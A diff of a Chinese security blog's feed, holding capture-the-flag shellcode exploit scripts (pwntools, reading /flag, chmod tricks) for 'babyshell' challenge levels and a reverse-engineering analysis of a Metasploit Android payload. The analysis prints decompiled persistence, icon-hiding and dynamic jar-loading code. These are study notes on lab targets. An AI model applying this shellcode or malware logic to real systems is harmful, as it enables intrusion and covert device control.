+# p.send(hex_shellcode + b&#39;\n&#39;)
 p.interactive()
-
-```
-
-
-
-### level 10
-
-要求从小到大，可以开始查一些单字节双字节指令插进去（这题用的多的是nop）
-
-```python
-from pwn import *
+</code></pre>
+<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>要求从小到大，可以开始查一些单字节双字节指令插进去（这题用的多的是nop）</p>
+<pre><code class="python">from pwn import *
 from string import *
 from random import *
-# context.syntax = 'intel'
-context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+# context.syntax = &#39;intel&#39;
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 # print(flag_file)
 
-shellcode = f'''
+shellcode = f&#39;&#39;&#39;
 //  open
     mov rbx, 0x67616c662f
     nop
@@ -14960,35 +14883,28 @@ shellcode = f'''
     nop
     nop
     inc rax
-'''
+&#39;&#39;&#39;
 
 hex_shellcode = asm(shellcode)
 print(hex_shellcode)
-# p = gdb.debug('./level9_chall_cp','b *main\nb *main + 912')
-p = process('./level10_chall')
-p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
-# p.send(hex_shellcode + b'\n')
+# p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
+p = process(&#39;./level10_chall&#39;)
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
+# p.send(hex_shellcode + b&#39;\n&#39;)
 p.interactive()
-```
-
-
-
-### level 11
-
-用的socket，和上题一样但是长很多所以调整更多
-
-```python
-from pwn import *
+</code></pre>
+<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>用的socket，和上题一样但是长很多所以调整更多</p>
+<pre><code class="python">from pwn import *
 from string import *
 from random import *
-# context.syntax = 'intel'
-context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
-flag_file = '/flag'
+# context.syntax = &#39;intel&#39;
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
+flag_file = &#39;/flag&#39;
 flag_file = flag_file[::-1]
 flag_file = flag_file.encode().hex()
 # print(flag_file)
 
-shellcode = f'''
+shellcode = f&#39;&#39;&#39;
 // socket:
     xor rdi, rdi
     xor rsi, rsi
@@ -15111,26 +15027,19 @@ shellcode = f'''
     syscall
     nop
     inc rax
-'''
+&#39;&#39;&#39;
 
 hex_shellcode = asm(shellcode)
-# p = gdb.debug('./level9_chall_cp','b *main\nb *main + 912')
-p = process('./level10_chall')
-p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
-# p.send(hex_shellcode + b'\n')
+# p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
+p = process(&#39;./level10_chall&#39;)
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
+# p.send(hex_shellcode + b&#39;\n&#39;)
 p.interactive()
-```
-
-
-
-### level 12
-
-不能重复，这里就用chmod那个打法
-
-```python
-from pwn import *
-context(os='linux',arch='amd64')
-shellcode = '''
+</code></pre>
+<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>不能重复，这里就用chmod那个打法</p>
+<pre><code class="python">from pwn import *
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
+shellcode = &#39;&#39;&#39;
     mov al, 0x5a
     mov sil, 7
     push 0x66     
@@ -15138,22 +15047,15 @@ shellcode = '''
     push rsp
     pop rdi
     syscall
-'''
-p = process('/challenge/babyshell_level13')
-p.sendafter('Reading 0x1000 bytes from stdin.\n',asm(shellcode))
+&#39;&#39;&#39;
+p = process(&#39;/challenge/babyshell_level13&#39;)
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,asm(shellcode))
 p.interactive()
-```
-
-
-
-### level 13
-
-前面的exp可以打通，这里不是很理解为什么没有write还可以push和pop
-
-```python
-from pwn import *
-context(os='linux',arch='amd64')
-shellcode = '''
+</code></pre>
+<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>前面的exp可以打通，这里不是很理解为什么没有write还可以push和pop</p>
+<pre><code class="python">from pwn import *
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
+shellcode = &#39;&#39;&#39;
     mov al, 0x5a
     mov sil, 7
     push 0x66     
@@ -15161,32 +15063,25 @@ shellcode = '''
     push rsp
     pop rdi
     syscall
-'''
-p = process('/challenge/babyshell_level13')
-p.sendafter('Reading 0x1000 bytes from stdin.\n',asm(shellcode))
+&#39;&#39;&#39;
+p = process(&#39;/challenge/babyshell_level13&#39;)
+p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,asm(shellcode))
 p.interactive()
 # 即使栈没有写权限，还是可以push和pop
-```
-
-
-
-### level 14
-
-6字节，这里只能read，调试利用已有的寄存器，`fd = 1`即可接着写入shellcode
-
-```python
-from pwn import *
-context(os='linux',arch='amd64', terminal=['tmux','splitw','-h'],log_level='debug')
-shellcode = '''
+</code></pre>
+<h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>6字节，这里只能read，调试利用已有的寄存器，<code>fd = 1</code>即可接着写入shellcode</p>
+<pre><code class="python">from pwn import *
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;],log_level=&#39;debug&#39;)
+shellcode = &#39;&#39;&#39;
     xor edi, edi
     mov esi, edx
     syscall
-'''
-# p = process('/challenge/babyshell_level14')
-# p = gdb.debug('/challenge/babyshell_level14','b *main + 634')
-p = gdb.debug('./level14_chall','b* main + 674')
-p.sendafter('Reading 0x6 bytes from stdin.\n',asm(shellcode))
-shellcode = '''
+&#39;&#39;&#39;
+# p = process(&#39;/challenge/babyshell_level14&#39;)
+# p = gdb.debug(&#39;/challenge/babyshell_level14&#39;,&#39;b *main + 634&#39;)
+p = gdb.debug(&#39;./level14_chall&#39;,&#39;b* main + 674&#39;)
+p.sendafter(&#39;Reading 0x6 bytes from stdin.\n&#39;,asm(shellcode))
+shellcode = &#39;&#39;&#39;
 //  open
     nop
     nop
@@ -15218,14 +15113,11 @@ shellcode = '''
     mov rdx, rax
     mov rax, 1
     syscall
-'''
+&#39;&#39;&#39;
 p.send(asm(shellcode))
 p.interactive()
-```
-
-
-
--->]]></content>
+</code></pre>
+]]></content>
   </entry>
   <entry>
     <title>初探驱动</title>
@@ -15242,7 +15134,456 @@ p.interactive()
   <entry>
     <title>msf Android马分析</title>
     <url>/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h6 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE:"></a>PREFACE:</h6><span id="more"></span>
+
+<h3 id="一、运行效果以及环境搭建"><a href="#一、运行效果以及环境搭建" class="headerlink" title="一、运行效果以及环境搭建"></a>一、运行效果以及环境搭建</h3><p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423141135014.png" alt="image-20240423141135014"></p>
+<p>已知这个马上线安卓13（我的测试机环境）是会被直接拦的，尝试了一下安卓7</p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172223131.png" alt="image-20240423172223131"></p>
+<p>可以上马，上的时候不会检测权限，但是shell不进去以及文件看不到，推测是权限管理系统拦了但是马没有申请，合理怀疑是安卓6.0以后需要动态申请权限，这里的马存在一定问题</p>
+<p>这边上一个android5，不行，报错</p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423172154053.png" alt="image-20240423172154053"></p>
+<p>上一个android6，成功！</p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423173618493.png" alt="image-20240423173618493"></p>
+<p>简单看一下我们的权限：</p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240423183527824.png" alt="image-20240423183527824"></p>
+<p>​		简单来说没什么用，大概研究一下应该是进应用沙箱了，但是权限是给满的，很奇怪，还是啥也干不了</p>
+<h3 id="二、逆向分析"><a href="#二、逆向分析" class="headerlink" title="二、逆向分析"></a>二、逆向分析</h3><h5 id="AndroidMainfest-xml"><a href="#AndroidMainfest-xml" class="headerlink" title="AndroidMainfest.xml"></a>AndroidMainfest.xml</h5><pre><code class="xml">    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.CHANGE_WIFI_STATE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_CONTACTS&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_SETTINGS&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.CAMERA&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.SET_WALLPAPER&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_CALL_LOG&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WAKE_LOCK&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot;/&gt;
+    &lt;uses-feature android:name=&quot;android.hardware.camera&quot;/&gt;
+    &lt;uses-feature android:name=&quot;android.hardware.camera.autofocus&quot;/&gt;
+    &lt;uses-feature android:name=&quot;android.hardware.microphone&quot;/&gt;
+</code></pre>
+<p>申请权限，注定这个马只能低版本使用</p>
+<pre><code class="xml">&lt;application android:label=&quot;@string/app_name&quot;&gt;
+    &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot; android:theme=&quot;@android:style/Theme.NoDisplay&quot;&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
+            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
+        &lt;/intent-filter&gt;
+        &lt;intent-filter&gt;
+            &lt;data android:host=&quot;my_host&quot; android:scheme=&quot;metasploit&quot;/&gt;
+            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
+            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;
+            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;
+        &lt;/intent-filter&gt;
+    &lt;/activity&gt;
+    &lt;receiver android:label=&quot;MainBroadcastReceiver&quot; android:name=&quot;.MainBroadcastReceiver&quot;&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
+        &lt;/intent-filter&gt;
+    &lt;/receiver&gt;
+    &lt;service android:exported=&quot;true&quot; android:name=&quot;.MainService&quot;/&gt;
+&lt;/application&gt;
+</code></pre>
+<p>活动类名：<code>MainActivity</code></p>
+<p>注册intent：</p>
+<ul>
+<li><code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</code> - 指定该活动为应用程序的主要入口点。</li>
+<li><code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</code> - 指定该活动为启动器活动，即显示在设备的应用程序列表中并且可由用户启动</li>
+<li>指定了<code>metasploit</code>协议链接的主机和方案</li>
+<li>等等</li>
+</ul>
+<h5 id="MainService"><a href="#MainService" class="headerlink" title="MainService"></a>MainService</h5><pre><code class="java">public static void start() &#123;
+    Class v0_2;
+    try &#123;
+        v0_2 = Class.forName(&quot;android.app.ActivityThread&quot;);
+        goto label_5;
+    &#125;
+    catch(ClassNotFoundException v0_1) &#123;
+        return;
+        try &#123;
+        label_5:
+            Method v1 = v0_2.getMethod(&quot;currentApplication&quot;);
+            Context v0_3 = (Context)v1.invoke(null, null);
+            if(v0_3 == null) &#123;
+                new Handler(Looper.getMainLooper()).post(new c(v1));
+                return;
+            &#125;
+            MainService.startService(v0_3);
+        &#125;
+        catch(Exception v0) &#123;
+        &#125;
+        return;
+    &#125;
+    catch(Exception v0) &#123;
+        return;
+    &#125;
+&#125;
+</code></pre>
+<ul>
+<li>尝试通过反射加载<code>android.app.ActivityThread</code>中的<code>currentApplication</code>方法并通过<code>invoke</code>执行，转化为context类型保存，如果获取不到Context，则通过主线程的 <code>Handler</code> 将一个新的 <code>Runnable</code> 对象发送到消息队列中，以便在主线程中执行，c中的逻辑为在运行时尝试通过之前传递进来的 <code>Method</code> 对象获取 <code>Context</code> 对象，并在获取成功时启动 <code>MainService</code> 服务</li>
+</ul>
+<pre><code class="java">final class c implements Runnable &#123;
+    private Method a;
+
+    c(Method arg1) &#123;
+        this.a = arg1;
+        super();
+    &#125;
+
+    @Override
+    public final void run() &#123;
+        try &#123;
+            Context v0_1 = (Context)this.a.invoke(null, null);
+            if(v0_1 != null) &#123;
+                MainService.startService(v0_1);
+                return;
+            &#125;
+        &#125;
+        catch(Exception v0) &#123;
+            return;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>java 反射：<a href="https://developer.aliyun.com/article/812647">深入理解Java中的反射机制及使用原理！详细解析invoke方法的执行和使用-阿里云开发者社区 (aliyun.com)</a></p>
+<ul>
+<li>允许运行中的Java程序获取自身信息,并可以操作类或者对象的内部属性</li>
+<li>程序中的对象一般都是在编译时就确定下来,Java反射机制可以动态地创建对象并且调用相关属性,这些对象的类型在编译时是未知的</li>
+<li>也就是说 ，可以通过反射机制<strong>直接创建对象,即使这个对象类型在编译时是未知的</strong></li>
+</ul>
+<p>类的加载机制：<strong>JVM</strong>使用<strong>ClassLoader</strong>将字节码文件,即 <strong>class</strong>文件加载到方法区内存中</p>
+<pre><code class="java">Class clazz = ClassLoader.getSystemClassLoader().loadClass(&quot;com.mypackage.MyClass&quot;);
+</code></pre>
+<p><strong>ClassLoader</strong>类根据类的完全限定名加载类并返回一个<strong>Class</strong>对象</p>
+<p>反射的用途：</p>
+<ul>
+<li>很多框架都是配置化的,通过<strong>XML</strong>文件配置<strong>Bean</strong></li>
+<li>为了保证框架的通用性,需要根据配置文件加载不同的对象或者类,调用不同的方法</li>
+<li>要运用反射,运行时动态加载需要加载的对象</li>
+</ul>
+<p><strong>这里主要就是用③，实现动态加载，反射是各种容器实现的核心</strong></p>
+<p>从类中获取一个方法后,可以使用<strong>invoke()</strong> 来调用这个方法</p>
+</blockquote>
+<pre><code class="java">public int onStartCommand(Intent arg2, int arg3, int arg4) &#123;
+    Payload.start(this);
+    return 1;
+&#125;
+</code></pre>
+<p><code>Service</code> 类的重写方法，用于处理启动服务的命令。<code>1</code> 表示如果服务被杀死了，系统尝试重新创建服务并调用 <code>onStartCommand()</code> 方法；即这里会维持在后台循环启动payload</p>
+<p>我们知道，frida会悬挂进程并多起四个线程（可以自行调试，这个地方还没有具体了解原理，不过需要注意）那么我们编辑运行基本的一个脚本就会观察到有</p>
+<pre><code class="javascript">setImmediate(function()&#123;
+    console.log(&quot;lld [*]&quot;);
+    Java.perform(function()&#123;
+        var myClass = Java.use(&quot;com.metasploit.stage.MainActivity&quot;);
+        myClass.implementation = function(v)&#123;
+        &#125;
+    &#125;)
+&#125;)
+</code></pre>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424133646117.png" alt="image-20240424133646117"></p>
+<p>后台重新加载了几次payload，使得vps重新接收到了sessions，随即关闭掉前面的链接，可以认为我们的推断是基本正确的，这部分实现了马的持久化</p>
+<p>测试payload的重加载：</p>
+<pre><code class="javascript">setImmediate(function()&#123;
+    console.log(&quot;lld [*]&quot;);
+    Java.perform(function()&#123;
+        var myClass = Java.use(&quot;com.metasploit.stage.MainService&quot;);
+        myClass.onStartCommand.implementation = function(arg2, arg3, arg4)&#123;
+            send(&#39;com.myclass.onStartCommand.implementation&#39;);
+            var ret = this.onStartCommand(arg2, arg3, arg4);
+            send(&quot;result:&quot;+2);
+            return 2;
+        &#125;
+    &#125;)
+&#125;)
+</code></pre>
+<img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424142410325.png" alt="image-20240424142410325" style="zoom:33%;">
+
+<p>修改返回值，服务会快速重置，但是新的连接无法维持，原因是我们hook了返回值为<code>START_NOT_STICKY</code></p>
+<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><h6 id="class-b"><a href="#class-b" class="headerlink" title="class b"></a>class b</h6><pre><code class="java">private static int a(byte[] arg4, int arg5) &#123;
+    int v0 = 0;
+    int v1 = 0;
+    while(v0 &lt; 4) &#123;
+        v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
+        ++v0;
+    &#125;
+
+    return v1;
+&#125;
+</code></pre>
+<p>这里明显是一个大小端序转化，基本上就是在对payload做数据处理，先大体手动还原符号，看起来就是简单编码还原payload内容并获取信息：</p>
+<pre><code class="java">package com.metasploit.stage;
+
+import java.io.UnsupportedEncodingException;
+import java.util.concurrent.TimeUnit;
+
+public final class b &#123;
+    private static final long timestamp;
+
+    static &#123;
+        b.timestamp = TimeUnit.SECONDS.toMillis(1L);
+    &#125;
+
+    private static int change_endian(byte[] arg4, int arg5) &#123;
+        int v0 = 0;
+        int v1 = 0;
+        while(v0 &lt; 4) &#123;
+            v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
+            ++v0;
+        &#125;
+
+        return v1;
+    &#125;
+
+    public static a a(byte[] arg11) &#123;
+        a v3 = new a();
+        v3.a = b.change_endian(arg11, 0);
+        long v6 = (long)b.change_endian(arg11, 12);
+        v3.b = b.timestamp * v6;
+        b.copy_array(arg11, 16, 16);
+        b.copy_array(arg11, 0x20, 16);
+        int v0 = 0x30;
+        if((v3.a &amp; 1) != 0) &#123;
+            v3.c = b.encode(arg11, 8000, 100);
+        &#125;
+
+        while(arg11[v0] != 0) &#123;
+            g v4 = new g();
+            v4.a = b.encode(arg11, v0, 0x200);
+            int v0_1 = v0 + 0x204;
+            long v8 = (long)b.change_endian(arg11, v0_1);
+            v4.b = b.timestamp * v8;
+            int v0_2 = v0_1 + 4;
+            long v8_1 = (long)b.change_endian(arg11, v0_2);
+            v4.c = b.timestamp * v8_1;
+            v0 = v0_2 + 4;
+            if(v4.a.startsWith(&quot;http&quot;)) &#123;
+                b.encode(arg11, v0, 0x80);
+                int v0_3 = v0 + 0x80;
+                b.encode(arg11, v0_3, 0x40);
+                int v0_4 = v0_3 + 0x40;
+                b.encode(arg11, v0_4, 0x40);
+                int v0_5 = v0_4 + 0x40;
+                v4.d = b.encode(arg11, v0_5, 0x100);
+                int v0_6 = v0_5 + 0x100;
+                v4.e = null;
+                byte[] v5 = b.copy_array(arg11, v0_6, 20);
+                int v2 = v0_6 + 20;
+                int v0_7;
+                for(v0_7 = 0; v0_7 &lt; v5.length; ++v0_7) &#123;
+                    if(v5[v0_7] != 0) &#123;
+                        v4.e = v5;
+                        break;
+                    &#125;
+                &#125;
+
+                StringBuilder v5_1 = new StringBuilder();
+                int v0_8;
+                for(v0_8 = v2; v0_8 &lt; arg11.length; ++v0_8) &#123;
+                    byte v7 = arg11[v0_8];
+                    if(v7 == 0) &#123;
+                        break;
+                    &#125;
+
+                    v5_1.append(((char)(v7 &amp; 0xFF)));
+                &#125;
+
+                String v0_9 = v5_1.toString();
+                v4.f = v0_9;
+                v0 = v0_9.length() + v2;
+            &#125;
+
+            v3.d.add(v4);
+        &#125;
+
+        return v3;
+    &#125;
+
+    private static String encode(byte[] arg3, int arg4, int arg5) &#123;
+        byte[] v0 = b.copy_array(arg3, arg4, arg5);
+        try &#123;
+            return new String(v0, &quot;ISO-8859-1&quot;).trim();
+        &#125;
+        catch(UnsupportedEncodingException v1) &#123;
+            return new String(v0).trim();
+        &#125;
+    &#125;
+
+    private static byte[] copy_array(byte[] arg2, int arg3, int arg4) &#123;
+        byte[] v0 = new byte[arg4];
+        System.arraycopy(arg2, arg3, v0, 0, arg4);
+        return v0;
+    &#125;
+&#125;
+</code></pre>
+<p>这里重载函数比较多，可以直接拿脚本批量打印一下看，</p>
+<pre><code class="javascript">function logInf(classs)&#123;
+    Java.perform(function ()&#123;
+        var Modifier = Java.use(&quot;com.metasploit.stage.b&quot;);
+        var modifiers = classs.getModifiers();
+        classs.setAccessible(true);
+        if (Modifier.isStatic(modifiers)) &#123;
+            // 静态字段
+            var value = classs.get(null);
+            console.log(classs + &quot; =&gt;&quot;  + value)
+        &#125; else &#123;
+             console.log(classs)
+        &#125;
+    &#125;)
+&#125;
+function getAllsonClass(classs)&#123;
+    console.log(&#39;\n&#39;)
+    console.log(&quot;查询到子类  =&gt;&quot; + classs.getName())
+    hookClass(String(classs.getName()))
+&#125;
+var thisclass = null;
+//&quot;java.security.MessageDigest&quot;
+function hookClass(CLASS)&#123;
+Java.perform(function()&#123;
+    var classStudent = Java.use(CLASS);
+    var classs = classStudent.class;
+ 
+    //获取所有内部类
+    var innerClasses = classs.getDeclaredClasses();
+    if(innerClasses.length &gt; 0)&#123;
+        innerClasses.forEach(getAllsonClass);
+    &#125;
+    console.log(&quot;===========&quot; + classs + &quot;中的所有变量==============&quot;)
+    //输出所有变量
+    classs.getDeclaredFields().forEach(logInf)
+    console.log(&quot;===========&quot; + classs +  &quot;的所有方法==============&quot;)
+    //输出所有方法,并hook
+    classs.getDeclaredMethods().forEach(function(method)&#123;
+        console.log(method)
+       var methodsName = method.getName();
+       var overloads  = classStudent[methodsName].overloads;
+    //    console.log(overloads.length)
+       for (var i=0; i&lt; overloads.length; i++)&#123;
+            overloads[i].implementation = function () &#123;
+            console.log(&#39;\n&#39;)
+            console.warn(&quot;进入&quot; + classs.getName() + &quot;类的&quot; + methodsName + &quot;方法&quot;)
+            for(var j=0; j&lt;arguments.length; j++)&#123;
+                console.error(&quot;参数&quot; + j + &quot; =&gt; &quot; + arguments[j])
+            &#125;
+            if (arguments.length === 0) &#123;
+              console.log(&quot;该函数无参数&quot;);
+            &#125;
+            var result = this[methodsName].apply(this,arguments)
+            console.error(&quot;结果是 =&gt; &quot; + result)
+            return result;
+            &#125;;
+        &#125;
+    &#125;)
+    console.log(&#39;\n&#39;)
+&#125;)
+&#125;
+function main()&#123;
+    try &#123;
+        hookClass(&quot;com.metasploit.stage.b&quot;)
+    &#125;catch (e) &#123;
+        console.log(&quot;没有找到该类&quot;)
+    &#125;
+&#125;
+ 
+setImmediate(main)
+</code></pre>
+<p>可以看到两个比较关键的结果：</p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154214031.png" alt="image-20240424154214031"></p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154229414.png" alt="image-20240424154229414"></p>
+<p>即，这里的payload就是msf马生成的信息部分，在b函数中还原出信息并添加生成一个http request包</p>
+<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><pre><code class="java">if((v6.a &amp; 4) != 0 &amp;&amp; Payload.b != null) &#123;
+    PowerManager.WakeLock v0 = ((PowerManager)Payload.b.getSystemService(&quot;power&quot;)).newWakeLock(1, Payload.class.getSimpleName());
+    v0.acquire();
+    v1 = v0;
+&#125;
+</code></pre>
+<ul>
+<li>这里创建了一个 <code>WakeLock</code> 对象 <code>v0</code>，它允许应用程序保持设备唤醒状态，这里通过 <code>Payload.b.getSystemService(&quot;power&quot;)</code> 获取了系统服务 <code>power</code>，并将其转换为 <code>PowerManager</code> 对象。然后调用 <code>newWakeLock(1, Payload.class.getSimpleName())</code> 方法创建了一个 <code>WakeLock</code> 对象，参数 <code>1</code> 表示创建的 <code>WakeLock</code> 类型是 <code>PARTIAL_WAKE_LOCK</code>，即部分唤醒锁定，它允许CPU继续运行，但允许屏幕和其他系统资源关闭。</li>
+</ul>
+<pre><code class="java">private static void a() &#123;
+    if(Payload.b != null) &#123;
+        String v1 = Payload.b.getPackageName();
+        PackageManager v2 = Payload.b.getPackageManager();
+        Intent v0 = new Intent(&quot;android.intent.action.MAIN&quot;, null);
+        v0.addCategory(&quot;android.intent.category.LAUNCHER&quot;);
+        for(Object v0_1: v2.queryIntentActivities(v0, 0)) &#123;
+            ResolveInfo v0_2 = (ResolveInfo)v0_1;
+            if(!v1.equals(v0_2.activityInfo.packageName)) &#123;
+                continue;
+            &#125;
+            v2.setComponentEnabledSetting(new ComponentName(v1, v0_2.activityInfo.name), 2, 1);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<ul>
+<li>实现了禁用启动器图标，与上文callback可以隐匿在后台刷新</li>
+</ul>
+<p>下面一段是进行基础的tcp解包，不需要讲，后面可以直接抓包看行为</p>
+<pre><code class="java">private static void a(DataInputStream arg11, OutputStream arg12, Object[] arg13) &#123;
+    if(Payload.e == null) &#123;
+        String v0 = (String)arg13[0];
+        String v1 = v0 + File.separatorChar + Integer.toString(new Random().nextInt(0x7FFFFFFF), 36);
+        String v2 = v1 + &quot;.jar&quot;;
+        String v3 = new String(Payload.a(arg11));
+        byte[] v4 = Payload.a(arg11);
+        File v5 = new File(v2);
+        if(!v5.exists()) &#123;
+            v5.createNewFile();
+        &#125;
+
+        FileOutputStream v6 = new FileOutputStream(v5);
+        v6.write(v4);
+        v6.flush();
+        v6.close();
+        Class v0_1 = new DexClassLoader(v2, v0, v0, Payload.class.getClassLoader()).loadClass(v3);
+        Object v2_1 = v0_1.newInstance();
+        v5.delete();
+        new File(v1 + &quot;.dex&quot;).delete();
+        v0_1.getMethod(&quot;start&quot;, DataInputStream.class, OutputStream.class, Object[].class).invoke(v2_1, arg11, arg12, arg13);
+    &#125;
+    else &#123;
+        Payload.class.getClassLoader().loadClass(Payload.e).getConstructor(DataInputStream.class, OutputStream.class, Object[].class, Boolean.TYPE).newInstance(arg11, arg12, arg13, Boolean.valueOf(false));
+    &#125;
+
+    Payload.c = -1L;
+&#125;
+</code></pre>
+<p>这里很明显动态生成了文件，并反射运行其中的部分内容，相同的方法抓取方法返回值和参数，可以拿到：</p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424161446827.png" alt="image-20240424161446827"></p>
+<p>反射运行了这个方法，这里仍旧是一个loader</p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160834420.png" alt="image-20240424160834420"></p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160846551.png" alt="image-20240424160846551"></p>
+<p>那么这里就需要获得里面的<code>met.jar</code>，有点缺乏经验不知道怎么搞（这里需要清楚，frida去hook的是app内所有的内容，即使loader加载的也不例外），不过询问了一下可以去hook <code>File.delete</code>，然后去找文件</p>
+<pre><code class="javascript">setImmediate(function()&#123;
+    console.log(&quot;lld [*]&quot;);
+    Java.perform(function()&#123;
+        var myClass = Java.use(&quot;java.io.File&quot;);
+        myClass.delete.implementation = function()&#123;
+            // var ret = this.onStartCommand();
+            console.log(&quot;delete hooked&quot;);
+        &#125;
+    &#125;)
+&#125;)
+</code></pre>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424190256641.png" alt="image-20240424190256641"></p>
+<p>这frida确实有点好用的</p>
+<h5 id="met-jar"><a href="#met-jar" class="headerlink" title="met.jar"></a>met.jar</h5><p>根据刚才的分析，入口类就是这里的<code>com.metasploit.meterpreter.AndroidMeterpreter</code></p>
+<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424191136119.png" alt="image-20240424191136119"></p>
+<p>里面的马已经相当明文，就暂时不看了</p>
+]]></content>
   </entry>
   <entry>
     <title>driver复现(铁三2024)</title>
@@ -15413,5 +15754,1881 @@ int main()&#123;
 &#125;
 </code></pre>
 ]]></content>
+  </entry>
+  <entry>
+    <title>sandbox</title>
+    <url>/2024/04/04/sandbox/</url>
